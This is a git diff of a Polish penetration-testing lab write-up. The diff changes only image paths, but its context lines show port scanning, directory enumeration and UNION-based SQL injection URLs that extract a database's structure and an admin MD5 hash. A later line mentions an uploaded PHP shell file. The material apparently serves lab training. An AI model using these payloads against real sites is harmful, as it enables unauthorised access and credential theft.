@@ -14,7 +14,7 @@ Wyniki:
 - 80/tcp  – Apache 2.2.16 (Debian)
 - 25, 110, 119 itd. – proxy Avast
 
-![alt text](image-1.png)
+![alt text](img\image-1.png)
 
 ### Enumeracja katalogów (Gobuster)
 
@@ -32,7 +32,7 @@ Znalezione zasoby:
 - /show         → widok zdjęcia
 - /index.php    → strona główna
 
-![alt text](image-2.png)
+![alt text](img\image-2.png)
 
 
 ## UNION-based SQL Injection
@@ -46,7 +46,7 @@ http://192.168.56.6/cat?id=-1 UNION SELECT 1,version(),3,4
 Wynik:
 - MySQL: 5.1.63-0+squeeze1
 
-![alt text](image-3.png)
+![alt text](img\image-3.png)
 
 ## Enumeracja struktury bazy
 
@@ -63,7 +63,7 @@ Wynik:
 - login
 - password
 
-![](image-4.png)
+![](img\image-4.png)
 
 ### Pełna struktura
 komenda:
@@ -72,7 +72,7 @@ http://192.168.56.6/cat?id=-1UNION SELECT1,CONCAT(table_name,:,column_name),3,4 
 
 ```
 
-![](image-5.png)
+![](img\image-5.png)
 
 Tabele:
 
@@ -108,15 +108,15 @@ Payload:
 http://192.168.56.6/cat?id=-1 UNION SELECT 1,CONCAT(login,0x3a,password),3,4 FROM users
 ```
 
-![](image-6.png)
+![](img\image-6.png)
 
 Wynik(Hash MD5):
 - admin:8efe310f9ab3efeae8d410a8e0166eb2
 
-![](image-7.png)
+![](img\image-7.png)
 
 Uzyskaliśmy dostęp do konta admina
-![alt text](image-8.png)
+![alt text](img\image-8.png)
 
 dzięki czemu możemy:
 
@@ -125,7 +125,7 @@ dzięki czemu możemy:
 - możliwość usuwania
 
 
-![alt text](image-9.png)
+![alt text](img\image-9.png)
 
 ---
 
@@ -142,7 +142,7 @@ Wynik:
 - 6:danger_cat:cat_in_balaclava.jpeg
 - 8:reversedphp:shell.php3
 
-![alt text](image-10.png)
+![Image](img\image-10.png)
 
 
 Widoczny wpis:
